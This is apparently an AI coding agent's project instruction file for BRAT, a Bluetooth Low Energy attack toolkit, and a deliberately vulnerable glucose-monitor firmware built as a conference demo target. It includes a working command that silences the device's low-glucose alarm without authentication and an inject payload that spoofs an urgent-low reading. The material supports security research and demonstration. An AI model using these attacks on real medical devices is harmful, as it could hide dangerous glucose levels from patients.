# CLAUDE.md — BRAT + Demo Target

BRAT (BLE Recon and Attack Toolkit) lives here. The parent `../CLAUDE.md`
covers the Mira research context. This file covers the demo target and
any BRAT-specific guidance.

## Demo Target — GlucoSense-7A21

`demo-target/` — a deliberately vulnerable BLE CGM firmware for DEF CON Demo Labs.
**Do not modify** `demo-target/src/` unless fixing a bug — the vulnerabilities are intentional.

Full build + presentation instructions: `demo-target/docs/DEMO_INSTRUCTIONS.md`
Full build spec and environment notes: `demo-target/BUILD_SPEC.md`

### Quick reference

```
demo-target/
├── src/main.c            — Zephyr firmware source (GlucoSense-7A21)
├── prj.conf              — v1 insecure (name: GlucoSense-OPEN, no SMP)
├── prj_secure.conf       — v2 secure  (name: GlucoSense-SECURE, SMP+MITM+bonding)
├── CMakeLists.txt
├── docs/
│   ├── DEMO_INSTRUCTIONS.md   — step-by-step demo flow, all commands
│   ├── TECHNICAL_OVERVIEW.md
│   └── SECURITY_POSTURE_ANALYSIS.md
└── android/
    └── build/out/glucosense-viewer.apk   — companion Android app
```

### Build commands

```bash
# Activate NCS environment (must do before every build session)
cd ~/ncs && source .venv/bin/activate && export ZEPHYR_BASE=~/ncs/zephyr
cd /home/muzzu/Desktop/Medical/mira/brat/demo-target

# v1 — insecure
west build -b nrf52840dk/nrf52840 -d /tmp/build_v1
west flash -d /tmp/build_v1 --no-rebuild

# v2 — secure
west build -b nrf52840dk/nrf52840 -d /tmp/build_v2 -- -DCONF_FILE=prj_secure.conf
west flash -d /tmp/build_v2 --no-rebuild
```

### Hardware roles

| Role | Device | hci index |
|---|---|---|
| Scanning / posture / enum | nRF52840 USB dongle (Zephyr HCI USB) | **hci0** |
| Impersonation / inject | TP-Link UB500 Realtek `2357:0604` | **hci1** |
| Demo target | nRF52840-DK, addr `E5:E2:89:A3:8D:F1` | — |

Verify adapter indexes with `hciconfig` before every session — they swap on replug.
Fix dongle address after replug: `sudo hcitool -i hci0 cmd 0x08 0x0005 FE CA EF BE AD DE`

### Posture results (verified, stable)

- v1 (`GlucoSense-OPEN`): **3 CRITICAL, 3 HIGH, 4 MEDIUM**
- v2 (`GlucoSense-SECURE`): **0 CRITICAL, 0 HIGH**

### Wire protocol

```
7E 00 <dir> 10 20 <cmd> <len:u16be> <payload> <crc16:be> EF
CRC-16/MODBUS (poly 0xA001, init 0xFFFF, big-endian output)
```

Commands: 0x01 PING, 0x10 AUTH, 0x20 ALARM_SET, 0x30 STATUS, 0x40 TELEMETRY

STATUS (0x30) payload: `[0:2] glucose u16be | [2] alarm active | [3] authenticated | [4:8] fw version`
Demo inject payload: `0028010101000001` = 40 mg/dL, URGENT LOW

Rogue central (`brat drive`) — attacks the real device rather than the client.
Send a read-back before and after a state-changing command and BRAT proves the
change from the device's own replies:

```bash
sudo python3 -m brat drive -p glucosense_open --adapter hci0 \
    -a E5:E2:89:A3:8D:F1 --send 30 --send 20:00 --send 30 --wait 1.5 --confirm
```

Verified on v1: silences the alarm (`byte 2: 01 -> 00`) while glucose stays at
0x0028 = 40 mg/dL, with the device's own `authenticated` byte reading `00`
throughout. LED1 physically goes out. `--send 20:01` reverses it.

Profile: `profiles/glucosense_open.yaml` (5 emulation rules, full protocol block)

### Known traps

- `CONFIG_LOG_MODE_IMMEDIATE` causes a reset loop — never set it (deferred logging only)
- BlueZ cannot see one of its own adapters from another — dongle will not show UB500 advertisement
- Zephyr stops advertising on connect; advertising restarts via workqueue on disconnect
- NCS toolchain-manager does not exist on aarch64 — use `~/zephyr-sdk-1.0.1` directly

---

## BRAT — test suite

```bash
source venv/bin/activate
python -m pytest tests/ -q        # 284 tests, all should pass
```

Run tests before committing any change to `brat/`.
